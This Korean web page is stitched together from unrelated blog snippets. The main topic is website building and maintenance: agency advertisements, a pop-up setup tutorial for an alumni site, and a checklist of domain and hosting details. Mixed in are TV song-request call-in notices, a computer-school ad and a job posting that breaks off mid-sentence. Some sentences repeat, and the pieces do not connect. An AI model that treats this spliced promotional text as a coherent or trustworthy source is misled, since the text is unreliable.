홈페이지제작및관리에 대한 정보로 따분한 생활에 변화를 주세요!   홈페이지 관리업체를 고를 때  오타, 프로그램 오류복구, 팝업 이미지 제공 등과 같은  기본적인 홈페이지 유지 보수가 제공되는지 확인해 보아야 합니다.    홈페이지 제작을 계획하는 경우, 보통 홈페이지에 대한 전문적인 지식이 부족하기 때문에 홈페이지 전문업체를 선정해서, 제작을 맡기는 것이 바람직합니다.홈페이지를 실제로 만들다 보면, 다양한 변수들이 발생할 수 있습니다. 그렇기 때문에 홈페이지 제작 계획을 세울 때는 상세한 내용을 의논하는 것이 중요합니다.수 있습니다. 그렇기 때문에 홈페이지 제작 계획을 세울 때는 상세한 내용을 의논하는 것이 중요합니다.  홈페이지 제작 후 잘못된 부분이 발생한 상황에는 보수가 무상으로 진행될 수 있으니,  계약할 때 하자 보수와 관련한 무상 이행 여부를 까다롭게 살펴보는 것이 좋습니다.   쇼핑몰 홈페이지 제작에 관한 모든 정보    온라인 시장에 진입하기로 마음먹은 이상,  가장 빠르게 생각해야 하는 부분이 바로 홈페이지를 시작하는 것입니다.    홈페이지는 온라인으로 마주하는 고객들의 시선을 끌어서, 매출을 키우는 데에 가장 크게 기여하는 중요한 요소입니다.상품의 종류가 적은 경우 임대 쇼핑몰의 임대료가 무료로 제공되니 쇼핑몰 운영자라면 이같은 혜택을 놓치지 않도록 합니다.임대 쇼핑몰은 운영관리를 위해 필요한 대부분의 기본 기능들을 제공해 주기 때문에 쇼핑몰 운영자가 거의 프로그램에 신경 쓰지 않아도 간단하게 개설 가능합니다.  블로그형 사이트를 만들면 많은 컨텐츠를 담는다는 장점이 있습니다. 하지만 퀄리티에 일정 수준의 제한이 존재한다는 단점이 있으며,  디자이너에 따라 편차가 발생합니다.   컴퓨터 초보라도 금방 전문가 수준이 될 수 있다고?어디서나 간편하게 접할 수 있는 씨스꿀 컴퓨터스쿨이라면 가능합니다!씨스꿀 컴퓨터스쿨은 폭넓은 컴퓨터 프로그램 온라인 강좌를 제공하는 업체입니다.9개월 69.000원/1년 89,000원/2년 129,000원만 내면 모든 과목 반복 수강 무제한 가능!2년에 600여 강좌를 신규 제작 및 업데이트해 풍부하게 학습 지원해 드려요.저렴한 가격으로 배우고 기초부터 실무까지 활용할 수 있어요!교안 및 실습파일/기출문제/모의고사 모두 무료인 씨스꿀 컴퓨터스쿨에 문의하세요.휴학 복학 기간과 횟수가 무제한으로 수강이 편리합니다.    하루에 한 번도 감사할 만한 일이 생기지 않는다면그건 일상에서 무언가 빠져있다는 표시일지도 몰라요.오늘 홈페이지제작및관리에 관한 정보가 유용하셨다면     이에 감사하는 마음으로 다른 사람들과 이 감사함을 나누시길 바랍니다.   오늘도 행복하세요~!  사랑의 콜센타 [4회]네 번째 <사랑의 콜센타> 주제는 “학창시절 추억의 노래” 80년대 학창시절을 보낸 부모님 세대의 나미, 전영록, 김완선, 소방차, 조용필,찐한 감성의 김수희, 세시봉, 이문세, 김종환의 노래부터~ 박진영, 엄정화, 솔리드, 쿨, 유승준 같은90년대 신나는 댄스 음악까지! 소녀들의 마음을 사로잡았던 80년대 영원한 오빠들의 곡,학창시절 소풍, 장기자랑을 평정했던 댄스곡,그 시절 나이트 클럽에서 우리를 들썩이게 했던 곡도 OK! 그렇다고 트로트를 빼놓을 수 없죠~~!남녀 불문! 세대 불문!모두가 좋아하는 TOP7의 트로트도 대환영! TOP7에게 듣고 싶은 그 시절 추억의 노래가 있다면<사랑의 콜센타>로 모두 모두 신청해주세요! [신청 일시]- 4/13(월) 오전 9시~11시 (딱 두 시간!!)  [신청 방법]1. 오전 9시부터 11시 사이, (국번없이) 1544-7666 번호로 전화를 건다.2. 전화 교환원과 통화 연결되면 정상적으로 신청 완료! [참고사항]- 이번 회차의 주제는 춤이 절로 나오는 ‘추억의 학창시절’입니다.  여러분이 TOP7에게 듣고 싶은 노래는 물론, 주제와 관련된 음악을 많이 신청해주세요!- 솔로곡, 듀엣곡도 신청 가능하니 참고해주세요. [주의 사항]- 연결이 안 될 경우, 모든 회선이 통화중이라는 뜻입니다.  잠시 후 다시 전화해주세요.- 교환원과의 통화내역은 개인정보수집활용동의 및 방송출연동의를 위해   녹취될 수 있음을 사전에 알려드립니다.   (거부하실 수도 있으나 이 경우 방송 참여는 불가능합니다.)- 신청이 완료됐다고 해서 모두 참여가 가능한 것은 아니며,   신청자에 한해서 4/13(월) 하루 동안 무작위로 선정하여 불시에 전화를 드립니다.  늦은 시간에 전화드릴 수 있으니 양해 부탁드립니다. 녹화를 늦은 시간 까지 하기 때문에~ 양해 부탁한느것은 맞지요?또한 하루에 4편, 5편 녹화를 하는 모양입니다.~하루 녹화분을 2주간 걸쳐서 활용을 할것으로 보입니다.​통화량이 많을것을 생각하셨어야되는데, 준비를 하지 못한 사랑의 콜센타입니다.사랑의 콜센타 시청소감에 올라온 글~(사랑의 콜센타 예시 인용된 글)- 손 첨 통화연결음 됫는데 끈엇어요 그분이 - 9시 정각부터 전화걸기 시작해서 9시 9분에 연결되었는데요, 그 전까진 통화량이 너무 많다, 통화중이다, 뚜뚜뚜뚜 소리 들리다가 어느순간 갑자기 정상적인 통화음이 가더니 계속 기다리니까 교환원 분깨서 전화를 받으셨어요 - 저 저번에 사연을 올렸던 사람입니다. 저도 통화를 하고 싶은데 계속이 연락이 안되고 있습니다. - 9시정각부터전화기붙잡고연결하는데 진짜여태연결이안되네요ㅜ 이제종료시까지30분낭앗는데ㅜ 흑흑 연결음한번씩갈때마다기뻐하면끊어져버리고ㅜ ​등~~~ 문제가 지속 되도록 사랑의 콜센타는 해결 방안을 모색해야합니다.하지만, 홈페이지도 관리에 어려움을 겪고 있는 모양입니다.전화상담까지 해결책을 마련하기 힘들어 보입니다.​신청곡을 불러드립니다-사랑의 콜센타는 이러한 부분을 알고있어야 할것입니다.만약 알면서도 무관한 부분이 발견 될시??모든 팬분들은 떠나 갈 것 입니다.  사랑의 콜센타 [5회]TOP7을 사랑하는 모든 여러분 주목!미스터트롯 <사랑의 콜센타>가 잠시 후 오픈됩니다! 다섯 번째 <사랑의 콜센타> 주제는 바로 ♥사랑♥​금방이라도 사랑에 빠질 것 같은 달달한 러브송이 듣고 싶으신 분들!가슴 아픈 옛 사랑의 이별 노래가 떠오르신 분들!내 모든 걸 다 바친 찐~한 사랑의 열병을 앓아보신 분들!TOP7에게 축가를 듣고 싶은 예비 신랑&신부님들!연애 상담이 필요한 불타는 청춘들!TOP7에게 듣고 싶은 노래가 있다면누구든지 <사랑의 콜센타>로 전화주세요!사랑을 듬~뿍 담아 TOP7이 직접 신청곡을 불러드려요~♥  [신청 일시]- 4/13(월) 오후 6시~8시 (딱 두 시간!!)  [신청 방법]1. 오후 6시부터 8시 사이, (국번없이) 1544-7666 번호로 전화를 건다.2. 전화 교환원과 통화 연결되면 정상적으로 신청 완료! [참고사항]- 이번 회차의 주제는 여러분의 ‘사랑’입니다.  여러분이 TOP7에게 듣고 싶은 노래는 물론, 주제와 관련된 음악을 많이 신청해주세요!- 솔로곡, 듀엣곡도 신청 가능하니 참고해주세요. [주의 사항]- 연결이 안 될 경우, 모든 회선이 통화중이라는 뜻입니다.  잠시 후 다시 전화해주세요.- 교환원과의 통화내역은 개인정보수집활용동의 및 방송출연동의를 위해   녹취될 수 있음을 사전에 알려드립니다.   (거부하실 수도 있으나 이 경우 방송 참여는 불가능합니다.)- 신청이 완료됐다고 해서 모두 참여가 가능한 것은 아니며,   신청자에 한해서 4/13(월) 하루 동안 무작위로 선정하여 불시에 전화를 드립니다.  늦은 시간에 전화드릴 수 있으니 양해 부탁드립니다.오후 6시~8시에 신청하는 딱 2시간도오전처럼 신청방법이 어려울듯합니다.TV조선의 사랑의콜센타가 많은 관심을 받는 중에,신청하는 국민에 대한 배려가 전혀 없을듯합니다.마음 차분히 가지시고,조금씩 기다려 보면, 좋은 결과가 있을 것으로 보입니다.​하지만 TV조선 사랑의 콜센타는 이런 미흡한 부분에대해서홈페이지에 관리 미흡부분,신청곡 신청 방법에 대한 미흡 부분에 대해서,더욱더 신경을 써야 할 것으로 보여집니다.​문제가 많아 보입니다.​​ ​   '팝업 관리- 홈페이지 관리 ③'  ﻿저번 포스팅 ' [홈페이지 관리] 게시판 관리 - 홈페이지 관리 ② ' 에서는게시판을 추가하는 방법에 대해서 알아보았는데요.이어서 이번에는 홈페이지 팝업창을 뜨게 하는 방법에 대해서 알아보도록 하겠습니다.^^명지대학교 총동문회 홈페이지를 예시삼아 설명드리도록 하겠습니다~ 팝업창은 여러방면에서 사용되는데요 .아래와같이 쇼핑몰에서 배송관리,지연,학교에서의 공지사항등 여러방면으로 사용됩니다~      위와 같이 홈페이지를 열었을 때 팝업창이 뜨게되면 아무래도 한번 보게 되기때문에 알릴 사항이 있을 경우 효율적으로 사용이 되겠죠?^^   1.게시판 추가하기 [커뮤니티] 메뉴 → [게시판관리] 메뉴에서 '등록' 버튼을 클릭해주세요.   생성하고자 하는 '게시판 이름'과 '게시판 타입' , '게시판ID'를 입력 후, '등록' 버튼을 클릭합니다. 생성된 게시판의 목록을 확인할 수 있습니다.   2.홈페이지 팝업창 등록하기 [홈페이지관리] 메뉴 → [홈페이지팝업관리] 메뉴를 클릭합니다.게시판 종류는 위에서 등록한 팝업 게시판을 선택한 후 '등록' 버튼을 클릭합니다.  '등록'을 클릭하시면 아래와 같이 홈페이지 팝업 관리 창이 뜹니다.Popup 제목 란에는 제목표시줄에 뜨게 될 타이틀을 작성해주시고,Popup Width와 Height는 각각 팝업창의 가로와 세로의 크기를 정해주시면 됩니다. 그리고 ' [홈페이지 관리] 명지대학교총동문회 - 홈페이지 관리 ① ' 포스팅을 참고하여'찾아보기...'를 클릭하여 올릴 이미지들을 첨부하여 주시고,[파일첨부] 버튼을 눌러주신 뒤 '저장' 버튼을 클릭해주시면 됩니다.  앞에서 등록한 팝업 목록을 확인할 수 있습니다.해당 팝업의 제목을 클릭하여 '수정' 화면으로 이동 합니다.  클릭해주시면 아까 작성했던 홈페이지 팝업 관리 창이 뜹니다. 이미지 첨부 와 팝업창 첨부 를 각각 나누어 설명해드리겠습니다.^^ 이미지 첨부 방법은 ' [홈페이지 관리] 명지대학교총동문회 - 홈페이지 관리 ① '포스팅에서 했던 방법과 마찬가지로첨부이미지 란의 URL을 '복사' 한 뒤,  (Insert Image) 버튼을 클릭하면프롬프트 창이 뜨는데요, 빈칸 안에 복사한 URL을 붙여넣기 한 뒤 '확인' 버튼을 클릭합니다.같은 방법을 적용하여 나머지 이미지도 첨부해주세요.^^  팝업창 첨부는 우선 팝업 창이 표시될 페이지의 URL 주소 뒷 부분만을 '복사' 한 뒤 [웹 페이지] 란에  '..복사한 나머지주소' 의 형식으로붙여기 한 뒤, 홈페이지에 팝업 창의 시작일과 종료일을 지정해줍니다.ex) ../Home/Default.aspx그리고 '추가' 버튼을 꼭 눌러주세요!  마지막으로 [웹 페이지 적용 란] 에 팝업창에 뜰 이미지와 내용을 정리하여 작성해주시고, '저장' 버튼을 클릭해주시면 됩니다.   완성된 팝업 창입니다. ^^  해당 홈페이지에 접속하시면 아래와 같이 팝업창이 적용된 것을 확인하실 수 있습니다.  팝업창 또한 이벤트 페이지 못지 않게 홈페이지의 첫 인상을 좌우하는 중요한 페이지라고 할 수 있는데요,요즘은 팝업창이 많이 사라지고 있는 추세이지만, 접속할때마다 공지사항이나 행사, 그 밖의 소식을 항상 상위에 뜨게하여고객분들의 더 많은 관심과 참여를 높일 수 있다는 장점이 있습니다.중요하거나 꼭 필요한 사항을 알릴 때에는 팝업창을 활용해보세요.^^                  여러분과 공유하고 싶은 정보, 홈페이지제작및관리!!홈페이지 제작 및 관리를 대행업체에 맡길 시 특장점, A-Z까지 파악하기!회사를 다니는 직장인들이 상사에게 듣고픈 말 1위는 “수고했어. 역시 자네가 최고야!’ 라고 해요.공감하시나요? 생각보다 대단한 말은 아니지만, 또 흔히 들을 수 있는 말도 아닙니다.저도 이 말이 듣고 싶은데… 오늘 준비한 홈페이지제작및관리 소식 확인하시고,댓글로 저한테도 이 한마디 부탁드려도 될까요? ^^ 오늘 내용 그럼 시작할게요~홈페이지 제작 관리 대행업체를 이용하게되면 도메인과 웹호스팅, 유지보수까지홈페이지 제작 관리에 관련된 모든 서비스를 경험할 수 있는만큼 편리한데요제작업체와 유지보수업체가 같으면 수정 속도도 빠르고 커뮤니케이션도 쉽습니다또한, 홈페이지 제작 대행업체에 홈페이지를 의뢰할 시 모바일페이지도 함께 제작할 수 있죠.모바일용 화면을 같이 만든다면 모바일로 들어오는 사람들도 불편 없이 이용할 수 있습니다.무엇보다 홈페이지 제작 대행업체에 웹페이지를 문의하면 트렌디한 홈페이지를 만들 수 있어요.최신 경향을 반영해서 홈페이지 디자인을 추천해주기 때문에 예쁜 홈페이지가 된답니다.홈페이지 제작을 대행업체에 맡길 경우 전문가의 손길로 프로페셔널한 홈페이지가 만들어지죠.수년간의 경험과 노하우를 가지고 있는 제작업체들은 직접 만든 홈페이지보다 퀄리티가 권장됩니다. 이뿐 아니라 홈페이지 관리 대행업체를 이용하셔서 사이트를 관리한다면 악성코드를 최소화할 수 있죠.보안서비스가 있어 악성코드를 제거하고 스팸메일을 줄여주는 등의 편의기능도 이용할 수 있어요.홈페이지 제작 및 유지보수, 알아두어야 할 요소는?근래에 홈페이지 제작할 때 가장 중요하게 생각하는 것이 바로 ‘꼴’입니다.시선을 붙잡기 위하여 네모, 동그라미 등의 ‘꼴’에 주목하여 페이지를 구성하고 있습니다.이처럼 홈페이지를 최초로 제작할 경우에는 제작 원본을 꼭 받아야 합니다.디자인 원본을 제공하지 않을 수도 있으므로 필수로 시안 작업 시작 전 체크하세요.제작 원본이 있을 경우에는 추후 다른 업체를 통해서도 수정이 가능합니다.그런가 하면 프리랜서 혹은 개인에게 사이트 주문을 맡기는 경우라면빠른 피드백이 불가능한 경우가 많기 때문에 사후에 관리가 어렵습니다따라서 유지 보수가 불가능한 일회성 사이트 제작이라고 보아도 무방합니다.홈페이지는 저렴한 초기 금액보다 철저한 유지 보수 및 관리가 더욱 중요합니다.따라서 후자를 최우선적으로 지정해놓고 업체를 선정하시기 바랍니다. 요컨대 이와 같이 홈페이지 제작 업체와 계약을 할 때에 초기 시안 작업 및 검수부터이후 수정 및 관리의 자세한 항목에 관련해 어떠한 조건으로 비용이 청구되는지 꼼꼼하게 검토하고업체와 협의를 통한 계약 내용 수정 및 추가를 통해서 업체 계약을 진행하는 것이 가장 좋습니다.고급스러운 홈페이지 제작으로 견적 대비 최고의 효과를 보기 원하는 분에게18년의 오랜 업력을 갖춘 드림인터페이스를 추천합니다. 드림인터페이스는 홈페이지/모바일 홈페이지/쇼핑몰 고급형 맞춤 제작회사에요.풍부한 실무 경험을 가진 개발진과 디자이너가높은 퀄리티로 제작하며, 여러 요구사항까지 적극 반영해 드립니다! 업체 홈페이지 제작이나 홈페이지 개편이 요구되는 시점이라면거품 없는 견적을 제안하는 드림인터페이스에 문의해보세요!어린시절 가장 듣기 짜증났던 잔소리가 무엇이었나요? 단연 “공부해라!” 일 것 같은데요.굳게 다짐했던 공부에 대한 열정도 뭉개버리는 잔소리! 그래도 가끔은 부모님의 잔소리가생각날 때도 있습니다. 그런 의미에서~ 오늘 포스팅을 끝으로 잔소리 한 마디 해드릴게요.제가 알려 드리는 홈페이지제작및관리 정보 공부, 게을리하시면 안돼요! ^^  며칠전 전 직장에서 같이 일했던 대리님께 전화가 왔었어요.이런 저런 근황 이야기하면서 얼마전 퇴사를 했고새롭게 개인 사업을 하고 싶은데홈페이지 하나 만들고 싶다고 하더라고요.​몇군데 견적을 받았는데 생각보다 비싸다고뭐 다른 방법이 없는지 물어보더라고요.​그냥 디자이너를 채용해서 만들어야 할지 이래저래 고민이라 하더라고요.​제 직업이 웹디자인이다보니이런 전화를 종종 받고 있어요.​  대리님과 이야기를 해 보니 굳이 디자이너 채용을 해서 홈페이지를 만들 정도는 아니더라고요.​홈페이지 만들어 두고 종종 관리만 하면 되는수준이라 직원을 채용하면 인건비 부담이 커질것 같더라고요. 디자이너 채용하게 되면 포토샵, 일러스트레이터도 돈 주고 써야하는데굳이 그렇게까지 비용을 쓸 필요가 없어보였어요.​ 출처 : 프리픽​하지만 대리님은 홈페이지 도메인, html,css, 반응형 홈페이지를 전혀 모르기 때문에 비싸지 않으며  잘 알아서 해줄 업체가필요하겠더라고요.​​ ​그런 대리님 회사에 월 3만원으로홈페이지를 만들어 주는 바른웹이딱 맞을것 같았어요.​​바른웹은PC 홈페이지, 모바일홈페이지, 반응형모두 제작을 해 주며미리 만들어 놓은 템플릿을 사용하지 않고전문디자이너가 직접 디자인을 해요.​획일적인 디자인이 아니라는게 장점이죠.​​반응형 홈페이지는 어떤 기기에서든홈페이지 내용이 최적화하여보여지는것을 말해요. :)​ ​또한, 랜섬웨어 걱정없이 2차 백업을 지원해 줘서혹시 감염되더라고 안심할 수 있어요.​구글, 네이버 포털에 사이트 검색등록까지 해 주기 때문에 신경 쓸 일이 거의 없어요.​별도로 호스팅 비용도 들지 않고도메인 무료등록까지이 모든것이월 3만원이면 정말 저렴한거죠.​​상담은 무료이니 혹시 홈페이지 만들기에관심 있다면 상담 받아보세요.​홈페이지 만드는데 큰 비용이들꺼라는 편견은 없어질꺼에요. ​  ​ ​  알에프로직스라면 홈페이지제작부터 관리까지걱정할거없어요!! 알에프로직스는 홈페이지디자인부터 홈페이지제작그리고 사후관리까지 꼼꼼하고 확실하게 전담해서 해주는 회사에요,​홈페이지제작 전문회사라고 생각하시면되세요!! 고객의견을 1순위로 두고 감동을 전하고 호기심을 충족시켜주는 회사 알에프로직스 기술과 서비스는 물론 깔끔하고 고급스런 디자인까지어느하나 빠지는것없이 제대로된회사구나 싶었답니다,​무한한 열정이 가득한 홈페이지제작 알에프로직스는혁식으로 고객에게 새경험을 전달해준다고하니 정말 최고죠? 홈페이지제작 결과물을 보는 포토폴리오만 봐도 정말 다양했는데요,쇼핑몰작업부터 이름만대면 모두가 알수있는 큰기업체 홈페이지까지 제작함에있어 이렇게 다양하고 세분화된 결과물이 나올수있구나싶기도했어요,​그리고 이벤트 페이지나 해외 고객들을 위한 번역기능+ 영어및 외국어버전의 홈페이지제작까지 하다보니 고객들이 상당히 많다고도하네요,​요즘은 웹페이지+모바일작업까지 일사천리로 샤샥~~ 30개이상의 기업체와 파트너스로써 좋은관계를 유지함은 물론,홈페이지제작으로 끝이아닌 부족한부분은 보수해주고 계속적으로 업데이트 해주면서 관리까지 해준다고하니 역시 홈페이지제작은 알에프로직스 맞죠?​홈페이지제작 고민하지마시구 알에프로직스에 맡겨보세요!!후회하지않으실거에요,  RFLOGIXPortfoliowww.rflogix.com ​ 네이버 블로그는 맞지만, 확인불가Ⅰ. 홈페이지 관리위해 알아둬야할 기본적인 정보(홈페이지 관리하기 1강)       ﻿﻿홈페이지(이하 쇼핑몰 포함)를 만든다는건 그렇게 쉽지는 않지요?   그래서 먼저 만들어져 있는 홈페이지를 어떻게 관리해야하는지를 다루어 볼까 합니다.물론 어떻게 관리해야하는지를 알면 어떻게 만드는지도 알게 되긴하겠네요~^^우리 홈페이지를 웹에이전시나 누구에서 위탁운영하더라도 아래와 같은 정보는 기본적으로 알고 있어야 한답니다.  ﻿﻿1. 제작정보  가. 홈페이지 제작업체 정보 및 담당자 정보 (업체명, 대표자, 위치, 연락처, 담당자 등)  나. 홈페이지 제작시의 계약서 및 유지보수 계약서 ﻿  ﻿ ※ 항상 연락될 수 있도록 해당업체의 정보뿐만 아니라 담당자의 직통전화나 휴대전화, 이메일등의 정보도 함께 알아둡니다.  ※ 그리고 유지보수 의뢰를 할때는 유선상으로 하지말고, 반드시 이메일이나 유지보수 창구를 통해 하시는 것이 좋습니다.       즉, 유지보수의뢰에 대한 기록을 남겨둬서 문서화 할 수 있도록 하셔야 합니다.﻿ ﻿ ﻿﻿﻿﻿2. 도메인정보   가. 도메인 소유인과 관리인 정보 나. 도메인 등록기관정보 및 계정정보 다. 도메인 등록일과 만료일﻿  ﻿ ※ 도메인의 소유가 가끔 내가 아니라 홈페이지제작업체나 제작담당자인경우가 있습니다.      이는 처음부터 나의 소유로 반드시 관리되어야 합니다.  ﻿ ※ 도메인의 등록일과 만료일을 홈페이지관리대장같은 것을 만들어 반드시 표기해놓고 스스로 챙겨야 합니다.  ﻿ ※ 사실 도메인은 관리업체에 관리하도록 하는 것보다, 소유주가 직접 관리하시는 것이 좋습니다.﻿  ﻿   ※ 잘 모르겠다고 그냥 홈페이지제작업체에 맡기시는 경우가 많은데, 아래 사이트에 들어가셔서 로그인하고 원하는 도메인을 검색하여 등록버튼만 누르면 쉽게 등록하실 수 있습니다. 단, 네임서버정보가 중요하니, 홈페이지제작업체에 네임서버정보를 보내달라고 하면 됩니다. 네임서버정보는 도메인과 서버가 연결되는 정보로서 아래의 호스팅업체에서 해당정보를 제공합니다. ﻿ [ 도메인등록업체 ]    ※ 위 업체 말고도 인터넷상에 '도메인등록'이라고 검색해 보면 상당히 많은 업체에서 등록대행을 하고 있습니다.    ﻿﻿3. 서버(호스팅)정보 (대부분은 호스팅을 받는 경우일테니, 웹호스팅을 기준으로 설명합니다.)﻿﻿    가. 호스팅제공업체/관리업체 정보﻿    나. 웹호스팅 제공 사이트 계정정보﻿    다. 호스팅 이용시 사용에 대한 계약관계과 만료일﻿    라. Flatform ﻿  ※ 홈페이지제작이나 유지보수계약된 업체의 정보가 아닌 호스팅 업체의 정보를 알아두면 좋습니다.    ﻿﻿ ※ 알아둬야할 정보 : 호스팅사이트URL, 로그인아이디, 비밀번호    ﻿﻿ ※ 세부정보 : FTP, DB 접근계정﻿    ﻿﻿    ※ 홈페이지제작업체나 유지보수업체가 호스팅을 할경우에는 FTP, DB접근을 위한 계정정보만 알아두면 되는데     이또한 상호간의 계약에 준합니다.﻿ ﻿[ 호스팅업체 ]     ※ 위 업체 말고도 인터넷상에 '웹호스팅'이라고 검색해 보면 상당히 많은 업체에서 등록대행을 하고 있습니다.  ﻿ ﻿﻿﻿﻿4. 관리자정보 ﻿    가. 홈페이지 관리를 위한 관리자 계정정보     ※ 기본적인 홈페이지관리(게시판이나 공지글, 회원관리등)를 위한 관리자 모드로 접근 계정을 알아둡니다.﻿  ※ 알아둬야할 정보 관리자모드 접근URL, 아이디, 비밀번호, 관리자모드 사용법 등﻿﻿  ﻿5. 소스 ﻿    가. 제작하고 납품시의 소스(psd, fla)와 코딩소스 전체, DB dump 자료 (CD로 따로 받아 관리하시면 됩니다.)﻿    나. 홈페이지 관리시 정기적인 변경소스 관리, 코딩소스/DB 백업﻿ ※ 디자인 소스(psd, fla) 파일의 제공은 의무적이지 않습니다. 홈페이지 제작사에게 해당 정보를 받으려면 계약당시에 함께 제공되기로 했는지를 확인해야 합니다. 하지만, 한마디 말이 천냥 빚을 갚듯 상호 이해관계내에서 말만 잘된다면 해당 소스파일을 받아놓을 수 있습니다. 하지만, 결코 의무적이지 않다는 것을 알야두셔야 합니다.﻿ ﻿﻿﻿ ﻿ ﻿지금까지 홈페이지 관리를 위해 알아둬야할 몇가지를 알아봤습니다. 위의 정보를 문서화해두면 가장 좋겠지요?^^ ﻿홈페이지 제작업체가 따로 있는 경우라면 해당 업체에 요구하셔도 됩니다. ^^ ﻿ 다음 시간에는...음...도메인과 호스팅 등록 방법을 알아볼까요?뭐가 유용할지 고민해보고 다시 포스팅 하겠습니다~~~﻿ ﻿ ﻿※ 기타 홈페이지를 관리하시다가 궁금하신게 있으시거든 언제든 문의해주세요~^^ ﻿    안녕하세요 신뢰를 가장 중요시 하는 홈페이지제작, 관리업체 담당자입니다.제가 이번에 글을 적는 이유는 일반적으로 사업하시는 분들이홈페이지제작,모바일홈페이지제작 또는 관리를 필요로 할 때 잘 모르셔서 업체에 휘둘리시는 경향이 있는데이에 기초적인 지식을 전해 주고자 작성하게 되었습니다.아래의 글은 전화 상담으로 사장님들이 자주 물어 보셨던 말 위주로 작성 해 보려 하구요. 홈페이지제작,모바일홈페이지제작 또는 홈페이지관리에 대해 아무것도 모르시는 사장님들께서는 꼭 끝까지 읽어보세요~ 도움이 되실 겁니다. 얼마 전 어떤 사장님 분께 전화가 와서 상담을 1시간 정도 해 드린적이 있습니다.전화를 끊고 나니 제 목이 다 아프더라구요 ^^사장님이 4달 전 어느분께 홈페이지제작을 300에 맡겼답니다.제작 기간은 2개월로 하기로 하고 총 10페이지 분량으로단순 가게 홍보 홈페이지를 만들기로 했는데3개월이 지나도록 제작이 안되어 있어 지금까지 작업한것 좀 보고 싶다고 하셨나 봐요그런데 처음에는 아직 완성이 안되어 있으니 완성된 후 보여주겠다 해서일주일 후 홈페이지를 보기로 했답니다.그리고 시간이 지나 홈페이지를 확인했는데 링크가 제대로 걸리지도 않은 상태에 메인페이지도 엉성하게 꾸며져 있었답니다.(제작자가 의뢰자에게 완성된 홈페이지를 넘겨줄때는반드시 링크는 제대로 걸려 있어야 합니다. 혹여 실수로 빠져있다면 바로 수정작업을 해야 하지요) 제가 홈페이지제작 결과물을 확인해 보니 예상 견적가가 150정도 나오더군요.제가 보기에는 디자인도 매우 엉성했고 무엇보다 디자인 하시는 분이 색감 자체를활용 못하는 분이더군요.그래서 제가 그분께 다시 디자인 색감 바꿔달라고 부탁 해보라고 하셨구요.(사실 디자인 주색감을 바꾸려면 모든 이미지 작업 다시 해야 합니다 ^^)지금 홈페이지제작 단가가 너무 높게 잡혀 있지만 처음에 계약을 그렇게 하셨으니 그 부분은 어쩔 수 없다라고 말씀드렸습니다.잔금 50%는 반드시 작업 완료 후 지불하시라고 말씀드렸구요.지금 생각해 보니 전혀 모르는 사장님에게 무료로 컨설팅만 해줬네요 ^^하지만 아무것도 모르시는 분께 조금이나마 힘을 줬다는 사실은 뿌듯하더군요.이렇듯 홈페이지제작은 제작 단가도 맞아야 하지만 제작 담당자와 의뢰자의 서로간의 신뢰가 가장 중요하다고 생각합니다.▶▶ 타사보다 저렴하게~,타사보다 멋있게 홈페이지제작,관리 살펴보기 많은 사장님들이 저에게 이런 질문을 많이 하십니다.이런이런 홈페이지를 제작하는데 얼마에요? 라고..음....솔직히 사장님들마다 업종이 틀리고 만들고 싶은 구성이 다 달라서그 자리에서 얼마입니다 라고 말씀드리기가 쉽진 않습니다.다만 단순홍보용인지 아니면 회원 연동(또는 컨텐츠 연동)해서 구성하는 홈페이지인지에 따라가격대는 어느정도 나와 있습니다.제가 아래에 시중의 가격대를 적어볼까합니다. 사장님들 참조하세요30만원대~ 홈페이지 - 템플릿에 디자인을 입히는 형태의 제작기본 5페이지 정도 구성되며 시중의 무료템플릿에 디자인을 새로 입혀주는 제작형태입니다.템플릿은 블로그와 같이 미리 여러 업체에서 만들어 놓은 틀이라고 생각 하시면 됩니다.거기에 컨텐츠(디자인+내용)를 채워 넣는거죠.페이지 수가 늘어날 수록 단가는 올라 갑니다.가게홍보,기본적인 기업홍보 등에 적합합니다.100만원~300만원대 홈페이지 - 나만의 독립홈페이지 형태의 제작방식남들과 같은 틀을 사용하는것이 아닌 독립적인 홈페이지로 의뢰자의 의중이 어느정도 반영됩니다.프로그래밍과 디자인을 새롭게 제작하는 형태로 인력소모가 템플릿 제작방식보다 많기 때문에 비용이 조금 올라갑니다.사장님들이 가장 많이 의뢰하시는 제작방식입니다. 업체홍보용으로 적합합니다.300만원~1000만원대 홈페이지 - 기획 설계부터 디자인,프로그래밍이 단계별로 진행되는 방식주로 매물을 올리는 홈페이지 또는 기획이 많이 들어간 홈페이지 등이 이용됩니다.또는 디자인 퀄리티가 우수한 홈페이지도 포함됩니다.예로 인테리어 홈페이지(디자인+매물), 부동산홈페이지(매물+회원), 쇼핑몰자체제작(매물+회원+결제)아이디어기획홈페이지(매물+회원+결제) 등 다양한 홈페이지 상품을 말합니다.얼마전 어느분이 전화를 하셔서 다짜고짜 교육매물 올리고 결제되고 회원관리 및 회원별 권한 설정하고  재능교육 사이트를 만들려고 하는데 얼마에요?..라고 물으시더군요.음 바로 얼마에요라고 말하는 업체는 우선 잡고보자 라는 업체겠죠 ^^조금 복잡한 구조의 웹사이트는 상담을 최소 30분정도 진행한 후제작자가 의뢰자에게 견적서를 전송하고 가격대가 안 맞으면서로 절충하는 시간을 가진 후 신뢰적인 계약을 통해 제작을 진행해야 합니다. 홈페이지제작과 더불어 가장 중요한 것은 바로 홈페이지관리입니다.제작만 해놓고 관리가 안되면 만드나 마나겠죠.홈페이지도 꾸준히 주기적으로 이미지디자인 교체해 주고최소 2년에 한번 홈페이지 리뉴얼을 해주어야 고객들이 살아있는 회사, 생동감 있는 회사로 인식하여 신뢰감이 상승하고 수익이 늘어나게 됩니다.대부분의 사장님들은 제작만 신경쓰는 편이신데회사나 업체 수익을 위해서는 홈페이지 관리가 제작보다 더욱 중요하다고 여겨집니다.  혹시 홈페이지제작이나 관리에 대해 도움을 받고 싶으시거나 제작,관리 상담을 받고 싶으신 분들은 아래에 저희 홈페이지를 방문해 주세요언제든지 도와 드리겠습니다. 제 글을 힘들게 끝까지 읽어 주셔서 감사합니다 꾸벅! ▽ 언제든지 친절하게 상담해 드리겠습니다 위 이미지를 클릭하거나 누르시면 홈페이지로 이동합니다.   당사는 진취적이고 창조적인 홈페이지 관리 및 쇼핑몰 관리 직원을 다음과 같이 모집합니다. 1.업무내용: 홈페이지 관리 및 쇼핑몰 디자인 관리, 카페, 블로그, 페이스북 관리 2.컴퓨터 활용 능력: 포토샵, 일러스트, 문서작성 등 ﻿​﻿​​﻿​﻿(당사 홈페이지 참조)3.채용형태: 재택근무, 프리랜서, 아르바이트 선택 지원(아르바이트는 업무능력에 따라 정식 직원 채용될 수 있음)4.제출서류: 이력서(상단에 채용형태 명기), 자기소개서(업무중심), 포토폴리오5.제출처: sm@max007.com6.전형방법: 